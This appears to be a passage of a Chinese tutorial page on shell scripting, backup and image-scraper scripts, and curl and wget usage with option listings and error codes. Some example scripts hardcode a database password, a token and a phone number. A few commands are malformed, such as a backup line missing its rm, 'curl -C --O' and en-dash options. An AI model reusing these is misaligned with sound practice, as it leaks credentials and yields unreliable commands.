    echo "参数总数有 $# 个!"
    echo "作为一个字符串输出所有参数 $* !"
}
funWithParam 1 2 3 4 5 6 7 8 9 34 73

</textarea>
</div>

<div id="shell_file">
<h3>Shell文件包含</h3><pre>
和其他语言一样,Shell也可以包含外部脚本,这样可以很方便的封装一些公用的代码作为一个独立的文件
在当前bash环境下读取并执行filename中的命令

Shell文件包含的语法格式如下:
. filename        # 注意点号和文件名中间有一空格
或
source filename   # source命令在当前shell环境中执行脚本

</pre><textarea>$ test1.sh
url="http://www.runoob.com"

$ test2.sh
#使用 . 号来引用test1.sh 文件,或者使用以下包含文件代码 source ./test1.sh
. ./test1.sh
echo "菜鸟教程官网地址:$url"

$ chmod +x test2.sh     #为 test2.sh 添加可执行权限并执行,被包含的文件不需要可执行权限
$ ./test2.sh

</textarea><pre>
【远程执行shell脚本】

#!/bin/bash
ssh -t username@remote 'touch a.txt'

#!/bin/bash
# 远程更新git
ssh -t username@remote '
  touch a.txt
  git add .
  git commit -m "documents"
  git push origin master
'

</pre>
</div>

<div id="shell_eg">
<h3>shell脚本实例</h3><textarea># 数据库备份脚本

#!/bin/bash
MYSQL_USER=root         #mysql用户名
MYSQL_PASS=e9china.net  #mysql密码
#定义数据库的名字和旧数据库的名字
DataBakName=Data_$(date +"%Y%m%d").tar.gz
OldData=Data_$(date -d -5day +"%Y%m%d").tar.gz
#删除本地3天前的数据
rm -rf /home/backup/Data_$(date -d -3day +"%Y%m%d").tar.gz
cd /home/backup
#导出数据库,一个数据库一个压缩文件
for db in `/usr/local/mysql/bin/mysql -u$MYSQL_USER -p$MYSQL_PASS -B -N -e 'SHOW DATABASES' | xargs`; do
(/usr/local/mysql/bin/mysqldump -u$MYSQL_USER -p$MYSQL_PASS ${db} | gzip -9 - > ${db}.sql.gz)
done
#压缩数据库文件为一个文件
tar zcf /home/backup/$DataBakName /home/backup/*.sql.gz
rm -rf /home/backup/*.sql.gz
echo "Mysql备份结束"

</textarea>数据库备份脚本2<textarea>#!/bin/bash
cd /home/mysqlbak
echo "You are In Backup Directory"
mv backup* /home/oldmysqlbak
echo "Old Databases are Moved to oldbackup folder"
Now=$(date +"%d-%m-%Y--%H:%M:%S")
File=backup-$Now.sql.gz
#格式 -u用户 -p密码 数据库 |gzip -9 > 数据库-$File
/usr/bin/mysqldump -uuser -ppasswd database |gzip -9 > database-$File
/usr/bin/mysqldump -uuser -ppasswd database |gzip -9 > database-$File
/usr/bin/mysqldump -uuser -ppasswd database |gzip -9 > database-$File
/usr/bin/mysqldump -uuser -ppasswd database |gzip -9 > database-$File
echo "Your Database Backup Successfully Completed"

</textarea>FTP备份脚本<textarea>#!/bin/bash
WEB_DATA=/home/wwwroot #要备份的网站数据,如果是使用lnmp安装包,则默认这个为网站目录
#定义web数据的名字和web数据的名字
WebBakName=Web_$(date +%Y%m%d).tar.gz
OldWeb=Web_$(date -d -5day +"%Y%m%d").tar.gz
#删除本地3天前的数据
/home/backup/Web_$(date -d -3day +"%Y%m%d").tar.gz
cd /home/backup
#压缩网站数据
tar zcf /home/backup/$WebBakName $WEB_DATA
echo "web备份结束"
给予脚本运行的权限
chmod 774 /root/mysqlbak.sh或者chmod +x /root/mysqlbak.sh
利用系统crontab实现每天自动运行:
crontab -e
每天晚上3:30分备份数据库
30 3 * * * /root/mysqlbak.sh
每个月1.10.30号备份一下WEB目录
45 4 1,10,30 * * /root/webbak.sh

</textarea><textarea>#!/bin/bash
#########################################
#图片下载器                              #
#script_name: dowonload_image.sh         #
#author:weixiaoxin write by 2017-09-20   #
#########################################

function get_second_level_url(){
  UA="Mozilla/5.0(Windows NT 6.2; WOW64) AppleWebKit/535.24(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"
  curl -s -o tmp.html -A "$UA" "$1"
  u=`grep -E -o "/Html/63/[0-9]+\.html\" target=\"_blank\"><span>[0-9]{2}-[0-9]{2}</span>" tmp.html|sed 's/ /_/ '`
  for line in $u
  do
    url=`echo $line|grep -E -o "/Html/63/[0-9]+\.html"`
    datetime=`echo $line|grep -E -o "[0-9]{2}-[0-9]{2}"`
    url_date+="$url,$datetime\n"
    #url_array[$url]=$datetime
  done

  echo  ${url_date}
}

function get_image(){
  UA="Mozilla/5.0(Windows NT 6.2; WOW64) AppleWebKit/535.24(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"
  curl -s -o tmp.html -A "$UA" "$1"
  title=`grep -E -o "<title>.*</title>" tmp.html|sed 's/[<title>|</title>]//g'`
  datetime=$2
  img_url=`grep -E -o "https://img.997pp.com/tp/[0-9]{4}/[0-9]{2}/[a-zA-Z0-9]+.jpg" tmp.html`

  if [ -z $img_url ]
  then
    img_url=`grep -E -o "http://img.997pp.com/tp/[0-9]{4}/[0-9]{2}/[a-zA-Z0-9]+.jpg" tmp.html`
  fi

  if [ ! -d "data/${datetime}/${title}" ]
  then
    mkdir -p data/$datetime/${title}
  fi

  n=1
  for i in $img_url
  do
    echo $i
    i=`echo $i|sed 's/https/http/g'`
    curl -s -o data/${datetime}/${title}/$n.jpg -A "$UA"  "$i"
    #sleep 2
    let n=n+1
    echo $n
  done
}

function index(){
  first_url="https://www.6858v.com/Html/63/index-5.html"
  second_url=`get_second_level_url ${first_url}`

  for line in `echo -e $second_url`
  do
    url=`echo $line|awk -F',' '{ print $1 }'`
    url="https://www.6858v.com$url"
    datetime=`echo $line|awk -F',' '{ print $2 }'`
    get_image $url $datetime
    #sleep 5
  done
}

index

</textarea><textarea>#!/bin/bash
## run  ./img_downloader.sh www.baidu.com -d images

if [ $# -ne 3 ];
then
 echo "Usage: $0 URL -d DIRECTORY"
 exit -1
fi

for i in {1..4}
do
  case $1 in
    -d) shift; directory=$1; shift;;
    *) url=${url:-$1};shift;
esac
done

mkdir -p $directory
baseurl=$(echo $url | egrep -o "https?://[a-z.]+")
echo "$baseurl"
curl -s $url | egrep -o "< img src=[^>]*>" |
sed 's/< img src=\"\([^"]*\).*/\1/g' > /tmp/$$.list
sed -i "s|^/|$baseurl/|" /tmp/$$.list
cd $directory;
while read filename
do
  curl -s -O "$filename" --silent
done < /tmp/$$.list

</textarea>
</div>

<div id="curl_wget" >
<h2>curl命令 访问下载网络资源</h2><pre>
curl是一种命令行工具,作用是发出网络请求,然后得到和提取数据,显示在标准输出(stdout),支持多种协议

</pre><textarea>$ curl --help
Usage: curl [options...] url

</textarea><pre>
获取网页
curl www.baidu.com  
curl "www.baidu.com"

保存网页:
-o 指定保存的网页名
-O 根据网页自动设置保存的文件名
curl -o baidu.html www.baidu.com
curl -O www.baidu.com
wget http://www.baidu.com
curl http://www.baidu.com > index.html

批量下载文件,最适合爬自己网站的缓存
curl http://www.xxx.com/action/[1-100].html > /dev/null
curl -o #1_#2 http://www.xxx.com/~{demo1,demo2}/[1-100].html  # 文件下载后重新命名和类正则使用,下载后的文件是demo1-001.html
curl -o –create-dirs http://www.xxx.com/~{demo1,demo2}/[1-100].html  # 创建需要的目录

显示请求的详细信息和通信过程:
-v参数查看DNS查询、SSL证书链中的信息及完整的http请求和响应header信息(> 符号表示请求数据,< 符号表示响应数据)
--trace参数显示更详细的通信过程
curl -v "www.baidu.com"
curl -trace output.txt "www.baidu.com"          // 保存到output.txt文件
curl -trace-ascii output.txt "www.baidu.com"

显示响应的头信息:
-i 可以显示http response头信息,同时也会显示网页源码
-I 只显示头信息
curl -i "www.baidu.com"
curl -I "www.baidu.com"
当有跳转时可以通过curl -L -I URL | grep Location来确定跳转到的新url地址

设置请求头信息:
curl --header "Content-Type:application/json" "www.xxx.com"
curl -H "Connection:keep-alive" http://www.jbxue.com
curl -l 127.0.0.1/spacobj/core/do?acid=100 -H "token:101hh" -H "Content-Type:application/json;charset=GBK" -X POST -d {"telNum":"13521389587","pass":"'my12345'","nick":"'明天1搜索1er好'","sms":"'7864AQ'"}

设置自定义请求头,php中对应$_SERVER['HTTP_TOKEN']
curl -vi -u admin:admin -H "TOKEN: nMVgwginuPbnMuJXVYfgOSgQg7Keo1rY" http://localhost:8888/a/article/List/index

cookie
--cookie参数可以让curl发送cookie
curl --cookie "name=xxx" www.example.com
至于具体的cookie的值,可以从http response头信息的`Set-Cookie`字段中得到
-c cookie-file保存服务器返回的cookie到文件
-b cookie-file使用这个文件作为cookie信息,进行后续的请求
curl -c cookies http://example.com
curl -b cookies http://example.com
-b/--cookie  < name=data>   向服务器提交cookie,若无=则name视为文件名
curl -b cookie.txt www.jbxue.com

curl -c ./kdcookie_c.txt -d "email=12324@kingdee.com&password=*" http://kdweibo.com/space/c/rest/user/login  # 产生cookie
curl -L  -b ./kdcookie_c.txt http://kdweibo.com/microblog  # 使用cookie访问

希望进行一些必须在登陆前提下的post请求,那就需要先保存之前的成功登陆的cookie信息,然后再携带登陆信息进行post请求
1.保存登陆cookie信息到文件可以通过以下2个选项中的任意一个实现
-c:保存cookie信息
-D:保存整个header信息,包括cookie,-D head.txt将服务器返回的header保存为文件,头部cookie也可被保存
curl -D header.txt www.jbxue.com
curl -c cookie.txt  -d "username=admin&password=admin" "www.xxx.com/doLogin"
运行后会在执行指令的目录下生成一个cookie.txt文件,当然也可以指定该文件的创建路径,相对路径绝对路径皆可,如cookie.txt可以改成/path/cookie.txt

2.携带登陆信息进行post请求需要使用-b选项指定使用哪个文件
curl -L -b cookie.txt -d "key=value" "url"

指定客户端的设备:
-A/--user-agent "浏览器信息"  指定发送请求的用户代理,通常服务器的日志会记录客户端浏览器的信息,有时候服务器会根据用户使用的设备返回针对刺身的页面,iphone4为例
curl --user-agent "Mozilla/5.0(iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9(KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7" "www.baidu.com"
curl -A My-Agent/1.0.0 www.jbxue.com

Referer字段
有时需要在http request头信息中提供一个referer字段,表示从哪里跳转过来的
curl --referer http://www.example.com http://www.example.com

网页重定向(自动跳转),输出跳转到的网页:
curl命令不会自动跳转,需要指定-L参数
curl www.sina.com
curl -L www.sina.com  # 自动跳转为www.sina.com.cn

指定请求方法和传递参数:默认get请求,-d < key=value>表示向服务器POST表单数据,键值对只有一个的话可不写双引号,多个键值对必须加上双引号,键值对之间用&连接
从本地文件中获取表单数据则在文件名前加@,例如:curl -d @data.xml http://www.jbxue.com
从标准输入获取则用curl -d "name=username&passwd=pwd" http://www.jbxue.com

curl -X GET "www.xxx.com?param1=1"
curl -X POST --data "data1=1&data2=2" "www.xxx.com"
curl --data "key=value&key=value" "url"
curl -d "key=value&key=value" "url"
curl -d "username=admin&password=admin" "www.xxxx.com/doLogin"
curl -L  -d "username=admin&password=admin" "www.xxx.com/doLogin"  # 登陆后重定向
curl -d "order=111&count=2" http://www.jbxue.com/buy    # -d表示post data

curl -i -X POST -d {\"a\":\"abcd\"} http://127.0.0.1/   # 发送json参数,大括号外不需要引号
curl -i -H "Content-Type: application/json" -X POST --data {\"a\":\"abcd\"} http://localhost/

curl -kv "10.95.123.233:8000/dir1/dir2?op_type=2" -d "alias=1756&data[category]=1444&data[template_col][city]=28&data[template_col][own][open]=0&data[template_col][own][show_dest]=1&data[template_col][own][order_model]=0&data[template_col][join][open]=0&data[template_col][join][show_dest]=1&data[template_col][join][order_model]=0"  # post传递数组

对请求参数进行编码:
curl -X POST --data-urlencode "data1=1&data2=2" "www.xxx.com"

curl -X POST -H "Content-Type: text/html; charset=UTF-8" --data-ascii "content=derinhält&date=asdf" http://myserverurl.com/api/v1/somemetho

【 -F, --form name=content Specify HTTP multipart POST data 】
＜form method="POST" enctype='multipart/form-data' action="upload.php"＞
　　文件上传的表单＜input type="file" name="upload"＞
　　＜input type="submit" name="press" value="OK"＞
＜/form＞
$ curl --form upload=@localfilename --form press=OK [URL]  # curl上传文件

-F参数模拟向服务器POST表单上传文件,相当于form表单中method="POST"和enctype="multipart/form-data"的情况
curl -F "myfile=@hellocurl.zip" "www.xxx.com/upload"
curl -F "myfile1=@hellocurl1.zip" -F "myfile2=@hellocurl2.zip" "www.xxx.com/upload"  # 上传的文件不止一个可以写多个-F "key=@value"

表单同时包含text,checkbox,select等和文件上传
这个时候不能同时使用-d和-F,这2个选项在curl中是两种方式的请求,-d为application/x-www-url-encoded方式发送post请求,而-F为multipart/form-data方式,同时使用-d和-F选项会报错Warning: You can only select one HTTP request
解决方案是通过增加-F或将字段以查询字符串的形式添加到url后
curl -F "filename=hellocurl" -F "myfile2=@hellocurl2.zip" "www.xxx.com/upload"
curl -F "myfile2=@hellocurl2.zip" "www.xxx.com/upload?filename=hellocurl"  // 仍然是post的提交方式

以向微信公众号新增临时素材为例
curl -F media=@test,jpg "https://api.weixin.qq.com/cgi-bin/media/upload?access-token=ACCESS_TOKEN&type=TYPE"
curl -F "web=@index.html;type=text/html" url.com
curl --form upload=@localfilename --form press=OK [URL]

【 添加proxy,通过代理ip访问网页 】
-x  ip:port 指定使用的http代理
curl -x 192.168.1.1:8080 www.jbxue.com

【 其它 】
断点续传保存文件:
-C参数实现断点续传,值未执行完成时结束再次重新执行可以查看效果
curl -C --O "www.xxx.com/music.mp4"

-r/--range  from-to 下载指定range内的数据
分块下载:先下1M,然后再下剩下的
curl -r 0-1024 http://www.xxx.com/aa.zip
curl -r 1025- http://www.xxx.com/aa.zip

破解网站的防盗链
-e url  设置引用头的值
curl -e "http://www.a.net" http://www.b.net/acion

限制url的传输速度
curl –limit-rate http://www.xxx.com/action

限制下载文件大小
curl –max-filesize 1024 http://www.xxx.com/action  # 超过1M将不执行操作,并且返回出错

响应超时
curl -m 40 http://www.xxx.com
curl –timeout 40 http://www.xxx.com

HTTP认证
有些网域需要HTTP认证时curl要用到`--user`参数,对应php $_SERVER['PHP_AUTH_USER']和$_SERVER['PHP_AUTH_PW']
curl --user name:password example.com
curl -u name:password example.com

测试参数
curl -o /dev/null -s -w %{time_connect}:%{time_starttransfer}:%{time_total} www.google.com  # 测试站点相应时间
curl -o /dev/null -s -w %{http_code} http://www.neocanable.com  # 查看http_code
curl -o /dev/null -s -w %{size_header} http://www.neocanable.com  # 网页或文件大小 

# 可以把变量写成文件的方式,然后加载
$ cat  readload
%{url_effective}\t
%{http_code}\t
%{http_connect}\t
$ curl -o /dev/null -s -w "@readload" 127.0.0.1:8083
http://127.0.0.1:8083   200 000　　

curl -o /dev/null -s -w "time_connect: %{time_connect}\ntime_starttransfer: %{time_starttransfer}\ntime_total: %{time_total}\n" "http://kdweibo.com" 

参数详解
%{url_effective}\t          这个url是最后获取的,如果在curl后添加"headers"请求参数这个是非常有用的,eg:
%{http_code}\t              HTTP(S)或FTP(s)请求响应状态码,在7.18.2版本中等同于"response_code",eg:200
%{http_connect}\t           在最后的响应,即(从proxy代理服务器到curl连接请求之前)的请求number,这个变量添加在7.12.4版本中,eg:000
%{time_total}\t             总的请求时间,单位秒,精度到毫秒,从curl开始到最终的返回的全部的请求耗时,eg:0.015 
%{time_namelookup}\t        从curl开始到域名解析完成所花费的时间,单位秒,eg:0.000 
%{time_connect}\t           从curl开始到TCP连接远程主机(或proxy)完成所花费的时间,单位秒,eg:0.000     
%{time_appconnect}\t        从curl开始到SSL/SSH等连接或握手到远程主机完成所花费的时间,单位秒,eg:0.000
%{time_pretransfer}\t       从curl开始到文件传输开始,包括预先开始传输期间的命令和涉及到特殊协议的协商所花费的时间,单位秒,eg:0.000
%{time_redirect}\t          它包括所有的如域名解析/连接/预先传输/最终的传输开始,该变量展示了对于多次重定向所耗费的完整执行时间,单位秒,eg:0.000
%{time_starttransfer}\t     它包括从curl开始到第一字节开始传输,包括%{time_pretransfer}和服务器计算结果的时间,单位秒,eg:1.880
%{size_download}\t          curl请求下载总的字节数,eg:7626
%{size_upload}\t            curl请求上传总的字节数,eg:0
%{size_header}\t            curl请求下载headers的总的字节数,eg:208
%{size_request}\t           curl在http请求中发送的总的字节数,eg:167
%{speed_download}\t         curl请求评估整个完成下载的平均下载速度,eg:517122.000
%{speed_upload}\t           curl请求评估整个完成上传的平均速度,eg:0.000
%{content_type}\t           curl请求的Content-Type文档请求类型,eg:text/html;charset=UTF-8 
%{num_connects}\t           在最近的传输中建立新的连接的数量,eg:1 
%{num_redirects}\t          在curl请求中重定向的数量,eg:0    
%{redirect_url}\t           当一个HTTP请求没有用-L选项(跟踪URL重定向),这个变量将展示实际的你想请求的实际URL的重定向,在7.18.2版本中添加的功能
%{ftp_entry_path}\t         当登录到远程FTP server时,curl结束的初始路径
%{ssl_verify_result}\t      结果展示对端server对ssl确认请求情况,0意味着确认是成功的,eg:0

-T localfile  向服务器PUT文件 例如:curl -T 1.mp3 www.jbxue.com/upload.php
-E cert.pem  指定本地证书
--compressed 采用压缩方式接收返回数据
--connect-timeout < s> 设置超时时间
--retry num
--retry timeo 指定重试的次数和间隔
--tcp-nodelay 打开TCP_NODELAY选项,不进行捎带确认

curl访问FTP服务器
curl ftp://myftpsite.com --user myname:mypassword  # 得到所有ftp服务器上的家目录下的目录和文件
curl ftp://myftpsite.com/mp3/mozart_piano_sonata.zip --user myname:mypassword -o mozart_piano_sonata.zip  # 下载某个文件
curl -T koc_dance.mp3 ftp://myftpsite.com/mp3/ --user myname:mypassword  # 上载某个文件
curl ftp://myftpsite.com/mp3/ --user myname:mypassword  # 列出某个子目录下的所有文件
curl ftp://myftpsite.com --user myname:mypassword -s | grep ^d  # 只列出目录,不显示进度条,并且使用grep来过滤结果
curl ftp://myftpsite.com/ -X 'DELE mp3/koc_dance.mp3' --user myname:mypassword # 从服务器上删除文件(使用curl传递ftp协议的DELE命令)
当结果需要放到一个变量进行查看时,最好加上-s参数

使用curl进行登陆测试
curl -c ./cookie_c.txt -F log=user -F pwd=** http://blog.51yip.com/wp-login.php
curl -D ./cookie_d.txt -F log=user -F pwd=** http://blog.51yip.com/wp-login.php
curl -b ./cookie_c.txt  http://blog.51yip.com/wp-admin/profile.php
curl -b ./cookie_d.txt  http://blog.51yip.com/wp-admin/profile.php

</pre><pre>
curl错误代码
1:未支持的协议。此版cURL不支持这一协议
2:初始化失败
3:URL格式错误。语法不正确
5:无法解析代理。无法解析给定代理主机
6:无法解析主机。无法解析给定的远程主机
7:无法连接到主机
8:FTP非正常的服务器应答。cURL无法解析服务器发送的数据
9:FTP访问被拒绝。服务器拒绝登入或无法获取您想要的特定资源或目录。最有可能的是您试图进入一个在此服务器上不存在的目录
11:FTP 非正常的PASS回复。cURL无法解析发送到PASS请求的应答
13:FTP 非正常的的PASV应答,cURL无法解析发送到PASV请求的应答
14:FTP非正常的227格式。cURL无法解析服务器发送的227行
15:FTP无法连接到主机。无法解析在227行中获取的主机IP
17:FTP无法设定为二进制传输。无法改变传输方式到二进制
18:部分文件。只有部分文件被传输
19:FTP不能下载/访问给定的文件, RETR(或类似)命令失败
21:FTP quote错误。quote命令从服务器返回错误
22:HTTP 找不到网页。找不到所请求的URL或返回另一个HTTP 400或以上错误。此返回代码只出现在使用了-f/–fail选项以后
23:写入错误。cURL无法向本地文件系统或类似目的写入数据
25:FTP 无法STOR文件。服务器拒绝了用于FTP上传的STOR操作
26:读错误。各类读取问题
27:内存不足。内存分配请求失败
28:操作超时。到达指定的超时期限条件
30:FTP PORT失败。PORT命令失败。并非所有的FTP服务器支持PORT命令,请尝试使用被动(PASV)传输代替！
31:FTP无法使用REST命令。REST命令失败。此命令用来恢复的FTP传输
33:HTTP range错误。range "命令"不起作用
34:HTTP POST错误。内部POST请求产生错误
35:SSL连接错误。SSL握手失败
36:FTP 续传损坏。不能继续早些时候被中止的下载
37:文件无法读取。无法打开文件。权限问题？
38:LDAP 无法绑定。LDAP绑定(bind)操作失败
39:LDAP 搜索失败
41:功能无法找到。无法找到必要的LDAP功能
42:由回调终止。应用程序告知cURL终止运作
43:内部错误。由一个不正确参数调用了功能
45:接口错误。指定的外发接口无法使用
47:过多的重定向。cURL达到了跟随重定向设定的最大限额跟
48:指定了未知TELNET选项
49:不合式的telnet选项
51:peer的SSL证书或SSH的MD5指纹没有确定
52:服务器无任何应答,该情况在此处被认为是一个错误
53:找不到SSL加密引擎
54:无法将SSL加密引擎设置为默认
55:发送网络数据失败
56:在接收网络数据时失败
58:本地证书有问题
59:无法使用指定的SSL密码
60:peer证书无法被已知的CA证书验证
61:无法辨识的传输编码
62:无效的LDAP URL
63:超过最大文件尺寸
64:要求的FTP的SSL水平失败
65:发送此数据需要的回卷(rewind)失败
66:初始化SSL引擎失败
67:用户名、密码或类似的信息未被接受,cURL登录失败
68:在TFTP服务器上找不到文件
69:TFTP服务器权限有问题
70:TFTP服务器磁盘空间不足
71:非法的TFTP操作
72:未知TFTP传输编号(ID)
73:文件已存在(TFTP)
74:无此用户(TFTP)
75:字符转换失败
76:需要字符转换功能
77:读SSL证书出现问题(路径？访问权限？ )
78:URL中引用的资源不存在
79:SSH会话期间发生一个未知错误
80:未能关闭SSL连接
82:无法加载CRL文件,丢失或格式不正确
83:签发检查失败

</pre>

<h3>wget命令 <a href="http://www.gnu.org/software/wget/manual/wget.html">manual</a></h3><pre>
wget is the non-interactive network downloader,即非交互的网络下载器
用于在终端中下载网络文件或整个http、https或ftp站点,其中也包括通过HTTP代理的下载,wget可以在用户退出系统的之后在后台执行

wget可以跟踪HTML、xhtml页面上的链接依次下载来创建远程服务器的本地版本,完全重建原始站点的目录结构,这又常被称作"递归下载"。在递归下载时wget遵循Robot Exclusion标准(/robots.txt). wget可以在下载的同时,将链接转换成指向本地文件,以方便离线浏览

wget非常稳定,它在带宽很窄的情况下和不稳定网络中有很强的适应性.如果是由于网络的原因下载失败,wget会不断的尝试,直到整个文件下载完毕。如果是服务器打断下载过程,它会再次联到服务器上从停止的地方继续下载,这对从那些限定了链接时间的服务器上下载大文件非常有用

【 curl和wget的区别 】
curl是LInux的数据传输工具,可以通过URL向服务器上传数据或从服务器下载数据,curl支持HTTP、FTP、SMTP、RSTP等应用层协议
wget是Linux系统中的文件下载命令,支持HTTP、FTP等协议。
wget是非交互性的,且具有自动下载功能,能自己在后台工作,用户logout之后wget仍然能够继续完成自己的工作

在高级用途上的curl由于可自定义各种请求参数所以长于模拟web请求,用于测试网页交互(浏览器);wget由于支持ftp和Recursive所以长于下载,用于下载文件(迅雷)。

curl和wget基础功能有诸多重叠,如下载等。
wget是个专职的下载利器,简单,专一,极致
curl可以下载,但长项不在于下载,而在于模拟提交web数据、POST/GET请求、调试网页等等
在下载上也各有所长,wget可以递归,支持断点;而curl支持URL中加入变量,因此可以批量下载
用途上,经常用wget来下载文件,加-c选项不怕断网;使用curl来跟网站的API交互,简便清晰

1.curl是libcurl库支持的,wget是一个纯粹的命令行命令。
2.curl支持更多的协议:FTP、FTPS、HTTP、HTTPS、SCP、SFTP、TFTP、TELNET、DICT、LDAP、LDAPS、FILE、POP3、IMAP、SMTP and RTSP,Wget支持HTTP、HTTPS and FTP
3.curl默认支持HTTP1.1(也支持1.0),而wget仅支持HTTP1.0规范
4.curl在指定要下载的链接时能够支持URL的序列或集合,而wget则不能这样;
5.wget支持递归下载,而curl则没有这个功能

1.下载文件
curl -O http://man.linuxde.net/text.iso             # O大写,不用O只是打印内容不会下载
wget http://www.linuxde.net/text.iso                # 不用参数,直接下载文件

2.下载文件并重命名
curl -o rename.iso http://man.linuxde.net/text.iso  # o小写
wget -O rename.zip http://www.linuxde.net/text.iso  # O大写

3.断点续传
curl -O -C -URL http://man.linuxde.net/text.iso     # C大写
wget -c http://www.linuxde.net/text.iso             # c小写

4.限速下载
curl --limit-rate 50k -O http://man.linuxde.net/text.iso
wget --limit-rate=50k http://www.linuxde.net/text.iso

5.显示响应头部信息
curl -I http://man.linuxde.net/text.iso
wget --server-response http://www.linuxde.net/test.iso

6.wget利器--打包下载网站
wget --mirror -p --convert-links -P /var/www/html http://man.linuxde.net/

【 help 】
由于wget使用getopt函数来处理选项和参数的,因此wget既支持长格式的选项,也支持短格式的选项,他们大部分是一一对应的关系,但不建议大家使用短选项。
当某个选项有参数时甚至可以在短选项和参数之间不加空格,比如-o log可以写成-olog,但这是不建议的
如果连续使用了多个短选项,且这些短选项不需要加参数,那么可以将他们组合在一起,如-d -r -c可以写成-drc,这是被建议的

当使用wget时,请务必查看/etc/wgetrc文件和家目录下的.wgetrc文件
在wgetrc文件中设置exclude_directories=wukong,bajie之后就不用在命令里设置了

Startup:
  -V, --version         display the version of Wget and exit
  -h, --help            print this help
  -b, --background      go to background after startup
  -e, --execute=COMMAND execute a `.wgetrc'-style command,wgetrc格式参见/etc/wgetrc或~/.wgetrc
  -e<指令>              作为文件".wgetrc"中的一部分执行指定的指令
  
Logging and input file:
  -o, --output-file=FILE     log messages to FILE
  -a, --append-output=FILE   append messages to FILE
  -d, --debug                print lots of debugging information,打印调试输出,调试模式
  -q, --quiet                quiet(no output),安静模式,不显示指令执行过程
  -v, --verbose              be verbose(this is the default),冗长模式,显示详细执行过程
  -nv, --no-verbose          turn off verboseness, without being quiet,关掉冗长模式
       --report-speed=TYPE   output bandwidth as TYPE.  TYPE can be bits
  -i, --input-file=FILE      download URLs found in local or external FILE
  -F, --force-html           treat input file as HTML
  -B, --base=URL             resolves HTML input-file links(-i -F) relative to URL
       --config=FILE          specify config file to use
       --no-config            do not read any config file
       --rejected-log=FILE    log reasons for URL rejection to FILE

Download:
  -t, --tries=NUMBER              set number of retries to NUMBER(0 unlimits)
       --retry-connrefused         retry even if connection is refused
  -O, --output-document=FILE      write documents to FILE
  -nc, --no-clobber               skip downloads that would download to existing files(overwriting them)
  -c, --continue                  resume getting a partially-downloaded file
       --start-pos=OFFSET          start downloading from zero-based position OFFSET
       --progress=TYPE             select progress gauge type
       --show-progress             display the progress bar in any verbosity mode
  -N, --timestamping          don't re-retrieve files unless newer than local
      --no-if-modified-since don't use conditional if-modified-since get requests in timestamping mode
      --no-use-server-timestamps don't set the local file's timestamp by the one on the server
  -S, --server-response           print server response
       --spider                    don't download anything
  -T, --timeout=SECONDS           set all timeout values to SECONDS
       --dns-timeout=SECS          set the DNS lookup timeout to SECS
       --connect-timeout=SECS      set the connect timeout to SECS
       --read-timeout=SECS         set the read timeout to SECS
  -w, --wait=SECONDS              wait SECONDS between retrievals
       --waitretry=SECONDS         wait 1..SECONDS between retries of a retrieval
       --random-wait               wait from 0.5*WAIT...1.5*WAIT secs between retrievals
       --no-proxy                  explicitly turn off proxy
  -Q, --quota=NUMBER              set retrieval quota to NUMBER
       --bind-address=ADDRESS      bind to ADDRESS(hostname or IP) on local host
       --limit-rate=RATE           limit download rate to RATE
       --no-dns-cache              disable caching DNS lookups
       --restrict-file-names=OS    restrict chars in file names to ones OS allows
       --ignore-case               ignore case when matching files/directories
  -4, --inet4-only                connect only to IPv4 addresses
  -6, --inet6-only                connect only to IPv6 addresses
       --prefer-family=FAMILY      connect first to addresses of specified family, one of IPv6, IPv4, or none
       --user=USER                 set both ftp and http user to USER
       --password=PASS             set both ftp and http password to PASS
       --ask-password              prompt for passwords
       --no-iri                    turn off IRI support
       --local-encoding=ENC        use ENC as the local encoding for IRIs
       --remote-encoding=ENC       use ENC as the default remote encoding
       --unlink                    remove file before clobber

Directories:
  -nd, --no-directories           don't create directories
  -x, --force-directories         force creation of directories
  -nH, --no-host-directories       don't create host directories
       --protocol-directories      use protocol name in directories
  -P, --directory-prefix=PREFIX   save files to PREFIX/..
       --cut-dirs=NUMBER           ignore NUMBER remote directory components

HTTP options:
       --http-user=USER         set http user to USER
       --http-password=PASS     set http password to PASS
       --no-cache               disallow server-cached data
       --default-page=NAME      change the default page name(normally this is 'index.html'.)
  -E, --adjust-extension          save HTML/CSS documents with proper extensions
       --ignore-length             ignore 'Content-Length' header field
       --header=STRING             insert STRING among the headers
       --max-redirect              maximum redirections allowed per page
       --proxy-user=USER           set USER as proxy username
       --proxy-password=PASS       set PASS as proxy password
       --referer=URL               include 'Referer: URL' header in HTTP request
       --save-headers              save the HTTP headers to file
  -U, --user-agent=AGENT          identify as AGENT instead of Wget/VERSION
       --no-http-keep-alive        disable HTTP keep-alive(persistent connections)
       --no-cookies                don't use cookies
       --load-cookies=FILE         load cookies from FILE before session
       --save-cookies=FILE         save cookies to FILE after session
       --keep-session-cookies      load and save session(non-permanent) cookies
       --post-data=STRING          use the POST method; send STRING as the data
       --post-file=FILE            use the POST method; send contents of FILE
       --method=HTTPMethod         use method "HTTPMethod" in the request
       --body-data=STRING          send STRING as data. --method MUST be set
       --body-file=FILE            send contents of FILE. --method MUST be set
       --content-disposition       honor the Content-Disposition header when choosing local file names(EXPERIMENTAL)
       --content-on-error          output the received content on server errors
       --auth-no-challenge         send Basic HTTP authentication information without first waiting for the server's challenge

HTTPS(SSL/TLS) options:
       --secure-protocol=PR     choose secure protocol, one of auto, SSLv2,SSLv3, TLSv1 and PFS
       --https-only             only follow secure HTTPS links
       --no-check-certificate   don't validate the server's certificate
       --certificate=FILE       client certificate file
       --certificate-type=TYPE  client certificate type, PEM or DER
       --private-key=FILE       private key file
       --private-key-type=TYPE  private key type, PEM or DER
       --ca-certificate=FILE    file with the bundle of CAs
       --ca-directory=DIR       directory where hash list of CAs is stored
       --crl-file=FILE          file with bundle of CRLs
       --random-file=FILE       file with random data for seeding the SSL PRNG
       --egd-file=FILE          file naming the EGD socket with random data

HSTS options:
       --no-hsts                   disable HSTS
       --hsts-file                 path of HSTS database(will override default)

FTP options:
       --ftp-user=USER             set ftp user to USER
       --ftp-password=PASS         set ftp password to PASS
       --no-remove-listing         don't remove '.listing' files
       --no-glob                   turn off FTP file name globbing
       --no-passive-ftp            disable the "passive" transfer mode
       --preserve-permissions      preserve remote file permissions
       --retr-symlinks             when recursing, get linked-to files(not dir)

FTPS options:
       --ftps-implicit                 use implicit FTPS(default port is 990)
       --ftps-resume-ssl               resume the SSL/TLS session started in the control connection when opening a data connection
